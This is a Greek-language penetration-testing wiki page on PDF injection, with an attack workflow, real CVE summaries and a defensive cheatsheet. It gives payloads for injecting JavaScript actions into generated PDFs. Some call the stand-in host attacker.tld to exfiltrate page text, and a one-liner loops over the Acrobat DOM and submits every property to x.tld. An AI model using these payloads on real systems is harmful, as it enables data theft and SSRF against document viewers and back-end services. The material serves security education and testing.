# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Αν η είσοδός σας αντικατοπτρίζεται μέσα σε ένα αρχείο PDF, μπορείτε να δοκιμάσετε να εισάγετε δεδομένα PDF για να εκτελέσετε JavaScript, να πραγματοποιήσετε SSRF ή να κλέψετε το περιεχόμενο του PDF.**
Η σύνταξη του PDF είναι εξαιρετικά επιεικής – αν μπορείτε να ξεφύγετε από το string ή το dictionary που ενσωματώνει την είσοδό σας, μπορείτε να προσθέσετε εντελώς νέα objects (ή νέα keys στο ίδιο object) που το Acrobat/Chrome θα αναλύσει χωρίς πρόβλημα.
Από το 2024 ένα κύμα bug-bounty αναφορών έχει δείξει ότι *one unescaped parenthesis or back-slash is enough* για πλήρη εκτέλεση script.

## TL;DR – Σύγχρονη Ροή Επίθεσης (2024-2026)
1. Βρείτε οποιαδήποτε τιμή ελεγχόμενη από τον χρήστη που καταλήγει μέσα σε ένα **(parenthesis string)**, `/URI ( … )` ή `/JS ( … )` πεδίο στο παραγόμενο PDF.
2. Εισάγετε `) ` (κλείνοντας το string) ακολουθούμενο από ένα από τα primitives παρακάτω και ολοκληρώστε με άλλη μία ανοιχτή παρένθεση για να κρατήσετε τη σύνταξη έγκυρη.
3. Παραδώστε το κακόβουλο PDF σε ένα θύμα (ή σε μια backend υπηρεσία που αποδίδει αυτόματα το αρχείο – ιδανικό για blind bugs).
4. Το payload σας τρέχει στο PDF viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Παράδειγμα (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Το πρώτο `)` κλείνει το αρχικό URI string, μετά προσθέτουμε ένα νέο **Action** dictionary που το Acrobat θα εκτελέσει όταν ο χρήστης κάνει κλικ στον σύνδεσμο.*

## Χρήσιμα Injection Primitives
| Στόχος | Payload Snippet | Σημειώσεις |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Εκτελείται άμεσα όταν το έγγραφο ανοίγει (λειτουργεί σε Acrobat, όχι σε Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Λειτουργεί σε PDFium & Acrobat αν ελέγχετε μια `/Link` annotation. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Συνδυάστε με `this.getPageNthWord` μέσα σε JS για να αποσπάσετε περιεχόμενο. |
| **Server-Side SSRF** | Το ίδιο όπως παραπάνω αλλά στοχεύστε ένα internal URL – εξαιρετικό όταν το PDF αποδίδεται από back-office services που τηρούν το `/URI`. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Επισυνάψτε σε Page/Annotation/Form dictionary για εκτέλεση κατά το άνοιγμα/εστίαση. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Αν η βιβλιοθήκη επιτρέπει την έγχυση χαρακτήρων νέας γραμμής, μπορείτε να δημιουργήσετε εντελώς νέα objects. |

## Embedded Actions as Injection Targets
Οι PDF viewers αντιμετωπίζουν τις **embedded actions** όπως `/OpenAction` και `/AA` (Additional Actions) ως λειτουργίες πρώτης τάξης που μπορούν να εκτελεστούν όταν ένα έγγραφο ανοίγει ή όταν ενεργοποιείται ένα συγκεκριμένο event. Αν μπορείτε να εγχύσετε σε οποιοδήποτε dictionary που αποδέχεται actions (Catalog, Page, Annotation, or Form field), μπορείτε να προσαρτήσετε ένα `/AA` δέντρο και να ενεργοποιήσετε JavaScript κατά το άνοιγμα/εστίαση.

Παράδειγμα payload για **generator-side object injection** (κλείστε το αρχικό string/dictionary και εγχύστε `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Αυτό το μοτίβο αντιστοιχεί σε πρόσφατα ζητήματα του jsPDF όπου attacker-controlled input που περνάει στο `addJS` (ή σε ορισμένα πεδία AcroForm) ξεφεύγει από το προοριζόμενο JavaScript string και εγχέει ένα **Additional Action** dictionary.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) released a one-liner that enumerates every object inside an unknown document – handy when you cannot see the generated PDF:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Ο κώδικας διατρέχει το Acrobat DOM και κάνει εξωτερικά αιτήματα για κάθε ζεύγος ιδιότητας/τιμής, παρέχοντάς σου ένα *JSON-ish* dump του αρχείου.
Δες το white-paper “Portable Data **ex**Filtration” για την πλήρη τεχνική.

## Πραγματικά Σφάλματα (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: οι συμβολοσειρές που ελέγχονται από επιτιθέμενους μπορούν να κλείσουν το JS literal και να εισάγουν δράσεις `/AA` → `/O` → `/JavaScript` που εκτελούνται στο open/focus.
* **CVE-2024-4367** – Αυθαίρετη εκτέλεση JavaScript στο Firefox’s PDF.js πριν την 4.2.67 παρακάμπτει το sandbox με μια κατασκευασμένη `/JavaScript` ενέργεια.
* **Bug bounty 2024-05** – Μεγάλο fintech επέτρεψε σημειώσεις τιμολογίου που προέρχονταν από πελάτες και κατέληξαν σε `/URI`; το report αμοιβήθηκε με $10k μετά από επίδειξη SSRF προς τον internal metadata host χρησιμοποιώντας `file:///` URI.
* **CVE-2023-26155** – `node-qpdf` command-injection μέσω μη απολυμασμένης διαδρομής PDF δείχνει τη σημασία του escaping των backslashes και των παρενθέσεων ακόμα *πριν* το επίπεδο PDF.

## Αμυντικό Cheatsheet
1. **Μη συνενώνεις ποτέ ακατέργαστη είσοδο χρήστη** μέσα σε `(`…`)` strings ή ονόματα. Escape `\`, `(`, `)` όπως απαιτείται από §7.3 του PDF spec ή χρησιμοποίησε hex strings `<...>`.
2. Αν κατασκευάζεις links, προτίμησε `/URI (https://…)` που θα URL-encode-άρεις *πλήρως*; μπλόκαρε σχήματα `javascript:` στους client viewers.
3. Αφαίρεσε ή επικύρωσε τα λεξικά `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` και `/ImportData` κατά το post-processing των PDFs.
4. Στον server, render-άρε untrusted PDFs με έναν *headless converter* (π.χ. qpdf –decrypt –linearize) που αφαιρεί JavaScript και εξωτερικές ενέργειες.
5. Κράτα τους PDF viewers ενημερωμένους· PDF.js < 4.2.67 και Acrobat Reader πριν τα patches Ιουλίου 2024 επιτρέπουν απλή εκτέλεση κώδικα.
6. Αν χρησιμοποιείς client-side generators (π.χ. jsPDF), ποτέ μην περνάς untrusted input στο `addJS` ή σε AcroForm setters που καταλήγουν μέσα σε PDF action dictionaries.

## Αναφορές
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
